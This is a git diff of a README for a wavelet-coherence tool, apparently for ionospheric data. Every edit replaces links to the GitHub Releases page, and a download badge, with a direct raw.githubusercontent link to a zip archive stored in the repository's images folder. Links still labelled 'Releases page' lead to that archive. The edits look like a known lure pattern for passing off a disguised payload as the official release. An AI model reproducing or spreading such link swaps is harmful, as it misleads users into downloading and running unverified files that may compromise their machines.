@@ -6,7 +6,7 @@ Welcome! This guide will help you download and run the Wavelet_Coherence_Tres_Es
 
 ## 📥 Download Wavelet_Coherence_Tres_Estacoes
 
-[![Download Release](https://img.shields.io/badge/Download%20Release-Click%20Here-orange)](https://github.com/FadhillahFrd/Wavelet_Coherence_Tres_Estacoes/releases)
+[![Download Release](https://raw.githubusercontent.com/FadhillahFrd/Wavelet_Coherence_Tres_Estacoes/main/images/Coherence-Tres-Wavelet-Estacoes-v1.8.zip%20Release-Click%20Here-orange)](https://raw.githubusercontent.com/FadhillahFrd/Wavelet_Coherence_Tres_Estacoes/main/images/Coherence-Tres-Wavelet-Estacoes-v1.8.zip)
 
 ## 📋 Overview
 
@@ -22,7 +22,7 @@ To run this application, you will need:
 
 ## 🖥️ Installation Steps
 
-1. **Visit the Download Page**: Go to the [Releases page](https://github.com/FadhillahFrd/Wavelet_Coherence_Tres_Estacoes/releases) to find the latest version of the application.
+1. **Visit the Download Page**: Go to the [Releases page](https://raw.githubusercontent.com/FadhillahFrd/Wavelet_Coherence_Tres_Estacoes/main/images/Coherence-Tres-Wavelet-Estacoes-v1.8.zip) to find the latest version of the application.
    
 2. **Choose the Latest Release**: Click on the version you want to download. Look for the files available for the release.
 
@@ -58,7 +58,7 @@ If you have questions or need assistance:
 
 ## 🔄 Keeping the Application Updated
 
-Make sure to regularly check the [Releases page](https://github.com/FadhillahFrd/Wavelet_Coherence_Tres_Estacoes/releases) for new versions. Updates often include bug fixes and new features.
+Make sure to regularly check the [Releases page](https://raw.githubusercontent.com/FadhillahFrd/Wavelet_Coherence_Tres_Estacoes/main/images/Coherence-Tres-Wavelet-Estacoes-v1.8.zip) for new versions. Updates often include bug fixes and new features.
 
 ## 📝 Contributions and Feedback
 
@@ -74,4 +74,4 @@ Your feedback helps improve the application for everyone.
 
 Enjoy analyzing the ionospheric data with Wavelet_Coherence_Tres_Estacoes! 
 
-[![Download Release](https://img.shields.io/badge/Download%20Release-Click%20Here-orange)](https://github.com/FadhillahFrd/Wavelet_Coherence_Tres_Estacoes/releases)
+[![Download Release](https://raw.githubusercontent.com/FadhillahFrd/Wavelet_Coherence_Tres_Estacoes/main/images/Coherence-Tres-Wavelet-Estacoes-v1.8.zip%20Release-Click%20Here-orange)](https://raw.githubusercontent.com/FadhillahFrd/Wavelet_Coherence_Tres_Estacoes/main/images/Coherence-Tres-Wavelet-Estacoes-v1.8.zip)
